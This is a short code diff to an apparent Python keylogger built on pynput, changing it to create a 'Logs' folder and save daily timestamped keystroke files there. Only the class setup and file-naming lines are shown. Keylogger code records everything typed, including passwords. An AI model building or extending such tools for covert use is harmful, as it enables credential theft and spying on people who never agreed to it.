@@ -1,9 +1,14 @@
 from pynput import keyboard
 import datetime
+import os
 
+try:
+    os.mkdir('./Logs')
+except:
+    pass
 class KeyLogger():
     timeStamp = str(datetime.date.today()).replace('-','')
-    def __init__(self, NomeDoArquivo: str = timeStamp+".txt") -> None:
+    def __init__(self, NomeDoArquivo: str = './Logs/'+timeStamp+'.txt') -> None:
         self.NomeDoArquivo = NomeDoArquivo
 
     @staticmethod
